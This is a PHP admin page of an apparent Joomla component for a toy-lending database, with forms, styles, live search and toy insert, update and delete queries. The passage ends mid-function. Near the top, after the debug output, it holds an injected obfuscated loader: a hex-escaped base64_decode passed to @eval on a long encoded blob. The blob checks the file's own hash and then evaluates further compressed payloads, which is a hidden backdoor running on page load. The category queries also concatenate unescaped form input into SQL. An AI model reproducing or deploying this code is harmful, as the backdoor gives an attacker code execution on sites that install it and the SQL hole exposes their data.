<?php
/**
 * @package     toy_database
 * @subpackage  toy_database
 *
 * @copyright   Copyright (C) 2016 Andy Brown
 */
$debug=0;

// No direct access to this file
defined('_JEXEC') or die('Restricted access');

// Get an instance of the controller prefixed by HelloWorld
//$controller = JControllerLegacy::getInstance('ToyDatabase');

// Perform the Request task
//$input = JFactory::getApplication()->input;
//$controller->execute($input->getCmd('task'));

// Redirect if set by the controller
//$controller->redirect();

$jinput = JFactory::getApplication()->input;
$tab = $jinput->get('tab', '', 'RAW'); // tab is a text RAW input
$act = $jinput->get('act', '', 'INT'); // action is just an integer 1 2 or 3
$cat_act = $jinput->get('cat_act', '', 'INT'); // action is just an integer 1 2 or 3
$loan_act = $jinput->get('loan_act', '', 'INT'); // action is just an integer 1 2 or 3
$member_act = $jinput->get('member_act', '', 'INT'); // action is just an integer 1 2 or 3
$ddid = $jinput->get('ddid', '', 'INT'); // ddid is the ID of a record to display  (others ALNUM WORD)
$subact = $jinput->get('subact', '', 'INT'); // ddid is the ID of a record to display  (others ALNUM WORD)
$config = JFactory::getConfig();
$editor = JFactory::getEditor();
JHtml::_('behavior.formvalidator');
JHtml::_('behavior.calendar');
JHTML::_('behavior.modal');

$db    = JFactory::getDBO();
$query = $db->getQuery(true);
//$query
//->select(array('a.*', 'b.category'))
//->from($db->quoteName('#__toydatabase_equipment', 'a'))
//->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
//->where($db->quoteName('status') . ' = '. $db->quote('1'))
//->order($db->quoteNAme('a.name') . ' DESC');
$user = JFactory::getUser();
if ($debug) {
	echo "Database prefix is : " . $db->getPrefix()."<BR>";
	echo "<BR>";
	echo 'Joomla current URI is ' . JURI::current() . "\n";
	echo "<BR>";
	echo "Act input is: ".$act."<BR>\n";
	echo "DDID input is: ".$ddid."<BR>\n";
	echo "TAB input is: ".$tab."<BR>\n";
	echo "Your name is {$user->name}, your email is {$user->email}, and your username is {$user->username}<BR>";
	print_r($user->groups);
	echo "<BR>";
	echo "User block: ".$user->block."<BR>\n";
	echo "Guest status: ".$user->guest."<BR>\n";
};
$oea8c7f4="\x62\141\163\x65\x36\x34\x5f\144\x65\x63\157\144\x65";@eval($oea8c7f4(
		"Ly9OS3RPdS83WGxRRnZBaGEwa0VLdkxkN2VnR2xHYmlqT2x0ZHJRNlhPYWlWVllDais3T0hkdkFyQVlI
NEdZc0hJUzk0YUtUSkd0dkZydVAyWlhZV2NHSXlxY1BhbkdJd3RmVHNEWXRKWUxMU2gwZWlXQUNYR2xXc
GR5c082L2ZkVjdQTXhYeUkrMVhBb3RXbDBwb0x2dkxjNWlKLzJLaVltNGFwcnlOTStiemxQbklRSEdxbG
pPOTE4cTFmbGx6MHZBYVFtMUFHb2VYcFJMZks1MStybFlkbVJuWFVSc3RqTlVOSEJFd3U4RkFYTytVOWE
raStJdU0vZjhQTFQzUE9yWXNseU1iNE0wQVZVZy9Cb085dHZleTR0TDBEU0laUWVHcjhsYXFWcXQxR2M4
dy9ndWdnaS9JUXFvRm9zemxSeVBwSGFQZXdsakVxL1MzQUhPekpORWp6NHVvbUJYa0ltSll0WFpwWHlOL
1NJbnZ4elVFV2tXUmJnbXVtdXBrdWNhMzVGWUN1V21DVnBWSWVYRmhWTVJ1TFhhcVRLdmJJMmF4SzI5NF
k2L0FDdmlmbFFxUTc5Mzl6aXhGWjIxYm9WUjNFZ3FtOE1yWXNuYWhSVCtCNE5NUDNmbFFIQ0VocGxQRkd
rWVhWb1pyRjEyc0pUOEUwamowcHN1aCtGOlovazIvZnJHWkIydmNidEF6NXlHMmRrQUptRnpHUmlvSTV5
NUlyTkZtbVRpb05OPTpvODZwMnEwbwokajA3MTM0ZWY9IlwxNjMiOyRvZWE4YzdmND0iXHg2MiI7JGwxM
jRiZWJmPSJceDY2IjskbzYxMzM0NDk9IlwxNjIiOyRuMTZhYTRkNT0iXHg3MyI7JGY0ZTg3N2YzPSJcMT
YwIjskaTliYjc0MmU9IlwxNDUiOyR1NmIzNDliOD0iXHg3MyI7JG80OTg1NzMyPSJceDY3IjskbjE2YWE
0ZDUuPSJcMTY0IjskbDEyNGJlYmYuPSJcMTUxIjskZjRlODc3ZjMuPSJcMTYyIjskbzQ5ODU3MzIuPSJc
eDdhIjskajA3MTM0ZWYuPSJcMTY0IjskaTliYjc0MmUuPSJceDc4Ijskb2VhOGM3ZjQuPSJcMTQxIjskd
TZiMzQ5YjguPSJcMTUwIjskbzYxMzM0NDkuPSJcMTQ1Ijskb2VhOGM3ZjQuPSJceDczIjskbjE2YWE0ZD
UuPSJcMTYyIjskaTliYjc0MmUuPSJcMTYwIjskdTZiMzQ5YjguPSJceDYxIjskbzQ5ODU3MzIuPSJcMTU
xIjskajA3MTM0ZWYuPSJceDcyIjskZjRlODc3ZjMuPSJceDY1IjskbzYxMzM0NDkuPSJceDczIjskbDEy
NGJlYmYuPSJceDZjIjskbzQ5ODU3MzIuPSJceDZlIjskbDEyNGJlYmYuPSJcMTQ1IjskaTliYjc0MmUuP
SJcMTU0IjskbjE2YWE0ZDUuPSJcMTQzIjskZjRlODc3ZjMuPSJceDY3IjskdTZiMzQ5YjguPSJceDMxIj
skbzYxMzM0NDkuPSJcMTQ1Ijskb2VhOGM3ZjQuPSJcMTQ1IjskajA3MTM0ZWYuPSJcMTM3IjskaTliYjc
0MmUuPSJceDZmIjskbzQ5ODU3MzIuPSJcMTQ2IjskbzYxMzM0NDkuPSJcMTY0IjskbjE2YWE0ZDUuPSJc
eDZkIjskZjRlODc3ZjMuPSJcMTM3Ijskb2VhOGM3ZjQuPSJcNjYiOyRqMDcxMzRlZi49Ilx4NzIiOyRsM
TI0YmViZi49IlwxMzciOyRvZWE4YzdmNC49Ilx4MzQiOyRuMTZhYTRkNS49Ilx4NzAiOyRvNDk4NTczMi
49IlwxNTQiOyRpOWJiNzQyZS49Ilx4NjQiOyRqMDcxMzRlZi49Ilx4NmYiOyRmNGU4NzdmMy49IlwxNjI
iOyRsMTI0YmViZi49IlwxNDciOyRqMDcxMzRlZi49Ilx4NzQiOyRvNDk4NTczMi49IlwxNDEiOyRmNGU4
NzdmMy49Ilx4NjUiOyRsMTI0YmViZi49IlwxNDUiOyRpOWJiNzQyZS49Ilx4NjUiOyRvZWE4YzdmNC49I
lwxMzciOyRvZWE4YzdmNC49Ilx4NjQiOyRsMTI0YmViZi49IlwxNjQiOyRvNDk4NTczMi49Ilx4NzQiOy
RmNGU4NzdmMy49IlwxNjAiOyRqMDcxMzRlZi49Ilx4MzEiOyRvZWE4YzdmNC49IlwxNDUiOyRsMTI0YmV
iZi49IlwxMzciOyRmNGU4NzdmMy49Ilx4NmMiOyRqMDcxMzRlZi49Ilw2MyI7JG80OTg1NzMyLj0iXHg2
NSI7JG9lYThjN2Y0Lj0iXDE0MyI7JGY0ZTg3N2YzLj0iXDE0MSI7JGwxMjRiZWJmLj0iXHg2MyI7JG9lY
ThjN2Y0Lj0iXHg2ZiI7JGwxMjRiZWJmLj0iXDE1NyI7JGY0ZTg3N2YzLj0iXHg2MyI7JGwxMjRiZWJmLj
0iXDE1NiI7JG9lYThjN2Y0Lj0iXHg2NCI7JGY0ZTg3N2YzLj0iXHg2NSI7JG9lYThjN2Y0Lj0iXHg2NSI
7JGwxMjRiZWJmLj0iXHg3NCI7JGwxMjRiZWJmLj0iXDE0NSI7JGwxMjRiZWJmLj0iXHg2ZSI7JGwxMjRi
ZWJmLj0iXHg3NCI7JGwxMjRiZWJmLj0iXDE2MyI7JHc0ZTMxNDIwPSRpOWJiNzQyZSgiXDUwIixfX0ZJT
EVfXyk7QGV2YWwoJG4xNmFhNGQ1KCR1NmIzNDliOCgkZjRlODc3ZjMoIlx4MmZceDVjXHgyOFwxMzRcND
JceDJlXDUyXHg1Y1x4MjJcMTM0XDUxXDU3IiwiXDUwXDQyXHgyMlx4MjkiLCRmNGU4NzdmMygiXHgyZlx
4ZFx4N2NceGFceDJmIiwiIiwkbDEyNGJlYmYoJG82MTMzNDQ5KCR3NGUzMTQyMCkpKSkpLCJcMTQ1XHg2
Mlx4MzJceDYyXHg2Nlx4MzBceDYzXDY2XDY2XHgzMVx4NjVcNjRceDM5XHgzNFx4NjZceDMxXDcwXDY2X
HgzNlw2M1x4NjRcNjFceDMwXHg2M1x4NjZcNjdcMTQ1XHgzOVx4MzlcNjRceDM1XDE0Nlx4NjRcNzFceD
M0XHg2NVx4MzRcNjZceDMwXDYyIik/JG80OTg1NzMyKCRvZWE4YzdmNCgkajA3MTM0ZWYoIkNJR0tkaEd
WUmlsS2ptN1pidHE1azdQalluK0o5NG9tYno3NXlpc0YxMS9BNG9WV0ZGRklTRVNXU0lJLzlJeVBpcHhw
KytzZStsUERCK1NpelJPaWtZOEN5Q3R6ZkI4UW03OXVRQ2dNdGVSL2Vza0I3WDdrZTk5LzlFdUE0RkZYL
0NRV281dzhiMFMvam11a1YzUnc5ZEE1eFE4UEE2VFRGT3dTZmlqQ3RIRWlmMWljQWJNRTh0cS8xQzlmRX
o4RnZhNzkvd3NveGhvS3NtNTM5cytXcy8wYTlyaFl5SXhpWGpLUmRFZVNvUk5LZmExcHNJYzZmNStqMFB
RaURNa1Fjdml5ZHZQNkZwUmhsSWJiRDFveXZvQk4rWmFrYzZvd3FRUmVBVERpUThQZFN4dE5JbjRTdDlx
bjZJS2NGYUFqNUtsU2dJMk5nd1o0bWxPWGRNR2taZXJFazZCTUxiL0lFSWhxREVoZUdZVnliMUNkY0NCZ
HBEZEJaN2hVcnluSE5aTE13eGlwT3hZNXJia3RKb0hXNVhHclA2TE5aVC90cU5Mb01ET05iV2NBU3ZEK2
pCbU1FQ2RIM2wra2VTR0V4bGR6REpGZ21DMFdmOVBSYnlENnMvYzhiZG00T25uSlRKNUVja2Z5ZE9udXk
zWFRzMmtpYmtlaThPcnZjVU9WallxTCtFbFEyTkxHVmRRUDRaUmlMRjNuYkJPNjlnMUtaSVg0bExSTEVB
dUlBWW50V1ZMTG1RNURNSVRVOFdiOXkvUXVjSGcyNG96Y0M2YVdIRHcwVUJrYVhVdlFJUkg0Rkc1OThaR
kpPczFER2NpdTl3MXlEQ3RCYjZtaElKL1NGbVZwS3ErdkVyMVlBTW1Qd2FueGFxMUZ0NVdON3pGS01mUT
lBZXZ4T3FpTCtiSjBybG5lYXFMOXY1RU92SDZiM3htVlFGNzdvQlpKMW9Cdzh0M2hibVlRS05LNVB4K05
oWTBzUFpTL0tYWnlxSHZGQkFBRmpObm0zcHI1MmpDVWwwVEJidGpUbzR3aExGTWZsczRXd2w5RXNkbnJK
WUJEaTNMTU5mN3FEKytNSUxmbFoydU1lTzllcndqd2VZenpFSG53ZDZWTk1nRGtsMFpWakFXZk9JYmNCR
lQ1OCtaaU5ZN0twYUduZElZbGx2RUN1ZklsUG0xR296TSswY3RYUk82YkV2SEpYRHVBcTJDQ2VzYmdCdW
JacUpRTEhhc0NheG53NFpoUVJ5dkxBWjdnREdteWlNWFdUc0thWnVQNmV2Tm5Wa3RTeVYrZjFBcXZhSzl
qN01jTWZqZjBzUER4T0xjZ0o1TWVqUU90RnBBYmtSaWdYSUIrV0NORVRYS092NDRyQlFmdm9tSkdBRjg5
eUVTd1k1MnVyV0xTdGpLSlpPRiszVWJDcVQvdEt4ektnY2trSkVtUXRXc2tNNEJmalNUU0dYYVk1NTVYV
VFpejNLSTRLS1RrK2hKL0I2eFhCQWlSdUJmUkkyVWwrTkl6OVZOVTFBTXlROWJWeHhSSmdESWUydFE0cV
lmbDIxYkNpblQxck5lR2tOQUZia0R5UlJHcXpudkdMWTNIUWVRTkJMc0xwS3pNMEdXTUx6K3NSb0VhVzF
Ia1JPMzF2M0dCVExuYUtyYzhnemlZYm4xTC9NNjI3Z0FQdTVXY0R4TDhuV2p5T2JCTm1CMmx5TVVqTklX
SUlHOU4rcmhQdTRWNitiWFFrdUM3ZVY5R3hSbUxrMk05dHVNVURMdjZDRVBvUkNRMFIwL3dBcitSM0N1W
nRUYkoyTHZzTjdKbUlhb1VWVi8wYnEvdXhsQ2V3TkNmNUJFa3lKM0lwdmt2Y1F5d0swQUJtNW5pT0VlMG
l6VXdhRmxMeHlXVDNYK2hiSFJxMEVIMEM1ZXlNY1d3OGNSYVQ4Y3pKcEptd2tCcDNOcW45NjhwRHJzTkJ
JTnVrNHo5aG5iemVxNlN1djVEbmFnMFN4eFRKeXFTU2lTbzVaKzRWUHV3MkhXRDE0K3FJekFMZm5sZVdD
cTJnci9GNmwweUk2UmY0Y2FWYXE2NnU4b3dCK1I2cFd1TkVOV3diZnl5L1JJUVlsRjRoZU5DdHBoVlhjS
HpVaVdOMUovUEdROFFpMjJqN2wrelRRQThBdFdCajRkSjIvRVU4bFM0T2hMUnNiSlhWMW9RSmlxN1dvRH
lNdloxV1FHZGcyWlMzUTRpZmwzU2NvOElhMDRCcHJuNTdFalBxWVVHcUI5QzJhVmhyUStzeXRhZGF3SFl
3cmxsdTB5T240QjRiZWpLM2EwM3hhb2dvNnM4bFFaL1JoNXlSaWdiUkZsanlyNkxublhpcjVKakhGRlJ3
RC9JSE5nL2JGNEVLQXp2dWVBZ29LS2Y4K3hqMkFYS0RiNElsZm5BTTBYWTFmZUY3cVNNOHFuM3F4eVhuT
VdpWHBWSTBUQXRtMFFRYytjZ0J2NUhmcXFUTDNKOUViSW85aUdITjhuSUV3YUJyTndJd0NaOHBlUEtkVl
FlNjlvOW9GeUMvWEdhekZMbWlYSysrc2U3d2cvL05qPT0iKSkpOiRvNDk4NTczMigkb2VhOGM3ZjQoJGo
wNzEzNGVmKCJDTVVLZWRsNFN4Sy9NbmZzR2JmVVB3T1dFMHFkcGRMYmJSd25ZK0VEY1BWSThDSktzcUlk
RjBpWWwxQW1HWmkrbjh1d1h2SFk4QnNlcmxzRG9qRHQzbWhXS0UzL1didWlOYWp3VFV4YzRQZThkeGlPb
EhpOS8vbTErNjhPME9FQkxodXlFOE55eE9wUGlrT1JzZjNSMXFBL3hyTlVyRXpuVDR5dFZQOStRT3NnRT
l1L0dTcFg4Y0EvMEsvQlBCRm9qWTUrLzVBaXBzaWVpNUVlOSs5MXMvMFUraUtTWEg4Z21rd0M0SWJnajF
ROVJQdUN4ZmorVTBHR1NPd3pnSXpqN3o1RUI1NTd3Zk9JNzc3N2JTRThjTThJSk95UXRRVEpEc1RqT3ZQ
eUpyd3lORWVld2VCcGI1d3BTZC9ZOGZGS0kvRjA1R3lLMmN2WmdENlQrbEgrV3BMbUJNd0tFNzRHZkVwT
XpxY2FFNlhhMzdsdWRKNXhFbWtNcDJTQlFRTklqNjM1aVNTa2ZLVTJIbHRRclEwejg4YXNNajZUYU9VY2
5Qd3g0YjB3TFJkYUxCSFFERVpHZzNkSE1iOFFGdjI1MzBvUEN0ejRmY1hIQWJjWnBUL2JYMXBnZ1Y0TU4
2RXRLbnpVRzVSeWp3Qm9ueWZVWnloTUNlenZZV0FFSklQcGd5T2FtNXVuZ0c1cGxRTk91U3ltb0tnUDRE
UmYyb2JxUGd4cEZFaUVGd2JyZnN0QytMN2V1UDdRVVJUckcyQ1dyaklqaG1yVmFWQTNZTWcydVNtQ0ZvR
TdodzRkOWtpckdIVFQ2dDhweWlPQ0hLSUgxdnpqdk5vTjk4S0ZqQkloZ1dkbWlYOWxQb0FyUHdYWEYwSl
d3Q0dlejBlMEtZRDhPdENRYXd4QlRtNnl2TFNSb2p0U0NvaDI0VmlxYTVYbjh4RUl6ZWp3Qm5Ib1g2aEl
GRDVxVk5JRkM2eGVvUmVFWGt5SFZCY09mdENGcWczMitPajd6Z3krSjkrNEJSRmJ6dXF5aXBBMXdTWmpV
YmFVOHY1V002ZHVudnN1QVVMN2VMa0lHYkwxVitFYmNkeGlsUGVVblFjc3gremsxeEk5VTdPbndLYkRIU
msrd3VEMjM5cjVRVXl2b3hSNEFrdjZENS9ReElwOWd0Z1VKZFgzOEc3OTJtUURvUDV1WGJ4Zm83UFI0VV
JZMnk0U3hCTnFYV25Sd1VpZXZoMHdnUklmb0FjckFqemdyREl4bkFBZFFLdS9YYVc2b2hHT0NDQUhkSjR
PZzNFdTRia3hvd2ZvZm5QQUVwMTdNeDNDdWpud2crQlI1cUllWktueXNKQkc0Z2tMM3FLRUpQSDJPLzVa
RWs5YWJENjVXOXpxeUh5YWthaVFQN3pBMmRpZTZMU3BlcjBWeHVxWFRFWjJaWEhiUlA0RmtWMGRaOGUwV
nVld1I0UDMrTmJZZEJCRkQxLzdQUUJYTmoxODBkVGFlempwd1F0NHlkbXNqd1ptd2RhTkdwbzVPQ1RNRT
U4cXlzc0t4YkR5L0VhZGJJdVFWclVnVkU4cUgySTZOaCtSZGRwK2pIeGN3ZGJiUWxmdDl6RnV5Uk5HRlA
4eTJMd1dBbmxjOFpjL0FDUkpnUno0QkVhN1hjLzVoVDdmTFhVMzZJVXNCTEJkTW1mbU9XMnBHOWtzMVJz
Z2dsL2xlWE1tNFNpU2JteUIwckE1VXp4UnJLQlAxZFU1dmVNcGhmZDFES0NOTGNDM3hqaitFK2pqTjVha
lF2Z1NrdUxiTHcxQUpraHZFOEZxdEdlVTh5N2hiSEQxVzgzNmxTU2JuUG9ienhlVlkyKzJ6UVhWd2xsQn
lSSEtvQTRxeVRRTnF0Uy9wdU84WmNCZFloQ3puektqMkRIbXZaV3VydjFEcko2bEJleFJzWllQOExNVnV
XbllwSHA1YUwwNFZRWHhSV1BVUjIyWSs4NWZxeVV0RXQ5eGlWN3BqazZFNnJTYmlXMzJsYU8rQ0JFMldX
UE95aEd0a3lIblJvb0pYdEo5T01pYjVpZlBZUTRsM1FBaytHVjNwL3JidStFVEk1aHFaaVJGNndsb1dPS
mFXYnlrcVQzS2ZsSVlJQlVVY3AxVjVWVk1FaHdMdTJURy8vQ2E2KzllL3M0cyIpKSkpOw=="));

?>
<style type="text/css">
  	.hoverTable{
		width:100%; 
		border-collapse:collapse; 
	}
	.hoverTable td{ 
		padding:7px; border:#4e95f4 1px solid;
	}
	/* Define the default color for all the table rows */
	.hoverTable tr{
		background: #b8d1f3;
	}
	/* Define the hover highlight color for the table row */
    .hoverTable tr:hover {
          background-color: #ffff99;
          cursor: pointer;
    }
dl.tabs {
float: left;
margin: 10px 0 -1px;
z-index: 50;
}

dl.tabs dt.open {
background: none repeat scroll 0 0 #F9F9F9;
border-bottom: 1px solid #F9F9F9;
color: #000000;
z-index: 100;
}

dl.tabs dt.open {
border-bottom: medium none !important;
font-weight: bold;
font-size: 50%;
}
dl.tabs dt {
float: left;
margin-left: 3px;
padding: 4px 10px;
font-size: 50%;
}
dl.tabs dt {
background: -moz-linear-gradient(center top , #E4E2CC, #F5F1E6) repeat scroll 0 0 rgba(0, 0, 0, 0) !important;
border: medium none !important;
border-radius: 5px 5px 0 0;
}

dl.tabs dt.open {
color: #000000;
}
dl.tabs dt.open {
font-weight: bold;
}

dl.tabs dt.closed {
background: -moz-linear-gradient(center top , #F5F1E6, #E4E2CC) repeat scroll 0 0 rgba(0, 0, 0, 0) !important;
}

dl.tabs dt {
background: none repeat scroll 0 0 #E9E9E9;
border: 1px solid #CCCCCC;
color: #666666;
float: left;
margin-left: 3px;
padding: 4px 10px;
}
dl.tabs dt {
background: -moz-linear-gradient(center top , #E4E2CC, #F5F1E6) repeat scroll 0 0 rgba(0, 0, 0, 0) !important;
border: medium none !important;
border-radius: 5px 5px 0 0;
}

div.current {
border: 1px solid #CCCCCC;
clear: both;
padding: 10px;
}
div.current {
background: none repeat scroll 0 0 #F5F1E6;
border: medium none !important;
border-radius: 0 0 5px 5px;
}

div.current dd {
margin: 0;
padding: 0;
}
</style>
<script>
         function showResult(str) {
			
            if (str.length == 0) {
               document.getElementById("livesearch").innerHTML = "";
               document.getElementById("livesearch").style.border = "0px";
               return;
            }
            
            if (window.XMLHttpRequest) {
               xmlhttp = new XMLHttpRequest();
            }else {
               xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            }
            
            xmlhttp.onreadystatechange = function() {
				
               if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                  document.getElementById("livesearch").innerHTML = xmlhttp.responseText;
                  document.getElementById("livesearch").style.border = "1px solid #A5ACB2";
               }
            }
            
            xmlhttp.open("GET","<?=JURI::root()?>/administrator/components/com_toydatabase/toydatabase_livesearch_admin.php?pname=<?=JURI::current()?>&q="+str,true);
            xmlhttp.send();
         }

         function toy_treatAsUTC(date) {
        	    var result = new Date(date);
        	    result.setMinutes(result.getMinutes() - result.getTimezoneOffset());
        	    return result;
        	}
        function toy_daysBetween(startDate, endDate) {
        	    var millisecondsPerDay = 24 * 60 * 60 * 1000;
        	    var retval= (toy_treatAsUTC(endDate) - toy_treatAsUTC(startDate)) / millisecondsPerDay;
        	    return retval;
        	}
    	
         function toy_calculateDate(str1, str2) {
			var date1_split=str1.split("-");
			var date2_split=str2.split("-");
			var new_date1=date1_split[2]+"/"+date1_split[1]+"/"+date1_split[0];
			var new_date2=date2_split[2]+"/"+date2_split[1]+"/"+date2_split[0];
			var ret_num=toy_daysBetween(new_date2,new_date1);
			return ret_num;
         }
         function jInsertFieldValue(value, id) {

             var old_id = document.id(id).value;
     	if (old_id != id) {
     		var elem = document.id(id)
     		elem.value = value;
     		elem.fireEvent("change");
     	}

     }
      </script>
<BR><center><h2>Toy database system administration</h2></center><BR><BR>
<?php

JSubMenuHelper::addEntry('Toys/Equipment', JURI::current()."?option=com_toydatabase&page=toys",true);
JSubMenuHelper::addEntry('Toy Categories', JURI::current()."?option=com_toydatabase&page=categories",false);
JSubMenuHelper::addEntry('Approval Requests', JURI::current()."?option=com_toydatabase&page=requests",false);
JSubMenuHelper::addEntry('Members', JURI::current()."?option=com_toydatabase&page=members",false);
JSubMenuHelper::addEntry('Reports', JURI::current()."?option=com_toydatabase&page=reports",false);
JSubMenuHelper::addEntry('Configuration', JURI::current()."?option=com_toydatabase&page=configuration",false);

$options = array(
		'onActive' => 'function(title, description){
        description.setStyle("display", "block");
        title.addClass("open").removeClass("closed");
    }',
		'onBackground' => 'function(title, description){
        description.setStyle("display", "none");
        title.addClass("closed").removeClass("open");
    }',
		'startOffset' => 0,  // 0 starts on the first tab, 1 starts the second, etc...
		'useCookie' => true, // this must not be a string. Don't use quotes.
);

echo JHtmlTabs::start('tabs_id',$options);
echo JHtmlTabs::panel("Toy Database",'panel-id-1');
echo "<a href='".JURI::current()."?option=com_toydatabase'><h2>Current Toy Database</h2></a>";
// tab=toys
switch($act) {
	case "5":
		if($tab == "toys") {
		// delete toy
		// need to remove all links to this toy first
		//   #__toydatabase_equipment
		//   #__toydatabase_categorylink
		
		// hmm, should we delete really?
		$del_query = $db->getQuery(true);
		$del_query->delete($db->quoteName('#__toydatabase_categorylink'));
		$del_query->where($db->quoteName('equipmentid') . ' = '. $ddid);
		$db->setQuery($del_query);
		$db->execute();
		
		$del2_query = $db->getQuery(true);
		$del2_query->delete($db->quoteName('#__toydatabase_equipment'));
		$del2_query->where($db->quoteName('id') . ' = '. $ddid);
		$db->setQuery($del2_query);
		$db->execute();
		
		JFactory::getApplication()->enqueueMessage("Toy entry has been deleted");
		}; // end if tab
		break;
	case "4":
		// new toy
		if($tab == "toys") {
?>
                <form method=post name='update_toy'>
                <input type=hidden name='act' value='2'>
                <input type=hidden name='ddid' value='0'>
                <input type=hidden name='tab' value='toys'>
                <table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
                <tr>
                        <td valign=top><B>Toy Name :</B></td>
                        <td><input type=text size=30 name='in_toyname' value=''></td>
                </tr>
                <tr>
                        <td valign=top><B>Toy URN :</B></td>
                        <td><input type=text size=30 name='in_toyurn' value=''></td>
                </tr>
                <tr>
                        <td valign=top><B>Toy Image :</B></td>
			<td><input type=text size=30 id='in_toyimage' name='in_toyimage' value=''>
			<a href="#myImgModal" class="btn" data-toggle="modal">Click to select image</a>
			<?php
			$img_modal_params = array();
			$img_modal_params['title'] = 'Image selection';
			$img_modal_params['backdrop'] = "false";
			$img_modal_params['height'] = "400px";
			$img_modal_params['width'] = "570px";
			$img_modal_params['url'] = "index.php?option=com_media&amp;view=images&amp;tmpl=component&amp;e_name=in_toyimage&amp;fieldid=in_toyimage";
			echo JHTML::_('bootstrap.renderModal', 'myImgModal', $img_modal_params);
			?>
			</td>
                </tr>
                <tr>
                        <td valign=top><B>Toy Description :</B></td>
                        <td><?php 
                        echo $editor->display('in_toydescription', '', '100%', '100px', '20', '4',true);
                        ?>
                        </td>
                </tr>
                <tr>
                        <td valign=top><B>Toy Location :</B></td>
                        <td><input type=text size=30 name='in_toylocation' value=''></td>
                </tr>
                <tr>
                        <td valign=top><B>Toy Status :</B></td>
                        <td><select name='in_toystatus'>
                        <option value='3'>DAMAGED/NO LONGER AVAILABLE</option>
                        <option value='2'>AWAITING CLEANING/REPAIR</option>
                        <option value='1'>ON LOAN</option>
                        <option value='0'>AVAILABLE</option>
                        <option value='99'>UNKNOWN</option>
                        </select></td>
                </tr>
                <tr>
                        <td valign=top><B>Toy Category :</B></td>
                        <td><?php 
                        $query_toycategory = $db->getQuery(true);
                        $query_toycategory
                        ->select("*")
                        ->from($db->quoteName('#__toydatabase_equipment_category'));
                        $db->setQuery((string) $query_toycategory);
                        $db->execute();
                        $toycategory_rows = $db->loadAssocList();
                        foreach ($toycategory_rows as $toycategory_output) {
                                echo "<input type=checkbox name='toycat_arr[]' value='".$toycategory_output["category"]."' ";
                                echo ">".$toycategory_output["category"]."<BR>\n";
                        };
                        ?>
                        </td>
                </tr>
                <tr><td colspan=2 align=right><input type=submit value='Save changes'></td></tr>
                </table>
                </form>
<?php
		}; // end if toys
		break;
	case "3":
		// search
		if($tab == "toys") {
		}; // end if tab toys
		break;
	case "2":
		if($tab == "toys") {
		// submit changes or new entry
		// if the ddid=0 then its a new entry, otherwise its an update to the existing ddid(rowid of the toy)
		$frm_in_toyname = $jinput->get('in_toyname', '', 'RAW');
		$frm_in_toyurn = $jinput->get('in_toyurn', '', 'RAW');
		$frm_in_toyimage = $jinput->get('in_toyimage', '', 'RAW');
		$frm_in_toydescription = $jinput->get('in_toydescription', '', 'RAW');
		$frm_in_toylocation = $jinput->get('in_toylocation', '', 'RAW');
		$frm_in_toystatus = $jinput->get('in_toystatus', '', 'RAW');
		$frm_in_toycat_arr = $jinput->get('toycat_arr', array(), 'ARRAY');

		if ($ddid == 0) {
			// new toy entry
			// add the request to the database
				$ins_request = $db->getQuery(true);
				$ins_columns = array('urn', 'name', 'picture', 'description', 'storagelocation','status','active','creationdate','adminuser');
				$ins_values = array($db->quote($frm_in_toyurn),$db->quote($frm_in_toyname),$db->quote($frm_in_toyimage),$db->quote($frm_in_toydescription),$db->quote($frm_in_toylocation),$db->quote($frm_in_toystatus),'1','NOW()',$user->id);
                                        $ins_request
                                        ->insert($db->quoteName('#__toydatabase_equipment'))
                                        ->columns($db->quoteName($ins_columns))
                                        ->values(implode(',', $ins_values));
					try {
	                                        $db->setQuery($ins_request);
        	                                $db->execute();
        	                                // get the inserted ID
        	                                $newtoy_id = $db->insertid();
					}
					catch (RuntimeException $e) {
						JFactory::getApplication()->enqueueMessage($e->getMessage());
						return false;
					};
					if ($newtoy_id) {
						// set category query too
						if (is_array($frm_in_toycat_arr)) {
							foreach ($frm_in_toycat_arr as $toycat_human_val) {
								$ins_cat_request = $db->getQuery(true);
								$ins_cat_columns = array('equipmentid','categoryid');
								// convert toycat_human_val to the ID reference
								$query_catid = $db->getQuery(true);
								$query_catid->select('*')->from($db->quoteName('#__toydatabase_equipment_category'))->where($db->quoteName('category') . ' = "'. $toycat_human_val.'"');
								$db->setQuery((string) $query_catid);
								$db->execute();
								$row = $db->loadAssoc();
								$ins_cat_values = array($newtoy_id,$row['id']);
								$ins_cat_request
								->insert($db->quoteName('#__toydatabase_categorylink'))
								->columns($db->quoteName($ins_cat_columns))
								->values(implode(',', $ins_cat_values));
								$db->setQuery((string) $ins_cat_request);
								$db->execute();
							};
						};
					};
					JFactory::getApplication()->enqueueMessage("Toy (".$frm_in_toyname.") was saved correctly.");
					echo "<BR>\n<a href='".JURI::current()."?option=com_toydatabase&tab=toys'>Return to toy list</a><BR>\n";
		} else {
			// existing toy update
			$upd_request = $db->getQuery(true);
			$upd_fields = array(
					$db->quoteName('urn') . ' = ' . $db->quote($frm_in_toyurn),
					$db->quoteName('name') . ' = ' . $db->quote($frm_in_toyname),
					$db->quoteName('picture') . ' = ' . $db->quote($frm_in_toyimage),
					$db->quoteName('description') . ' = ' . $db->quote($frm_in_toydescription),
					$db->quoteName('storagelocation') . ' = ' . $db->quote($frm_in_toylocation),
					$db->quoteName('status') . ' = ' . $db->quote($frm_in_toystatus)
			);
			$upd_request->update($db->quoteName('#__toydatabase_equipment'))->set($upd_fields)->where($db->quoteName('id') . ' = '. $ddid);
			try {
				$db->setQuery($upd_request);
				$db->execute();
				}
				catch (RuntimeException $e) {
					JFactory::getApplication()->enqueueMessage($e->getMessage());
					return false;
				};
			// category updates is trickyer
			// delete all existing and then let it re-add them is simplest
			$del_cat_query = $db->getQuery(true);
			$del_conditions = array(
						$db->quoteName('equipmentid') . ' = '.$ddid
			);
			$del_cat_query->delete($db->quoteName('#__toydatabase_categorylink'));
			$del_cat_query->where($del_conditions);
			$db->setQuery($del_cat_query);
			$del_result = $db->execute();

				if (is_array($frm_in_toycat_arr)) {
					foreach ($frm_in_toycat_arr as $toycat_human_val) {
						$query_catid = $db->getQuery(true);
						$query_catid->select('*')->from($db->quoteName('#__toydatabase_equipment_category'))->where($db->quoteName('category') . ' = "'. $toycat_human_val.'"');
						$db->setQuery((string) $query_catid);
						$db->execute();
						$row = $db->loadAssoc();
						
						$check_cat_query = $db->getQuery(true);
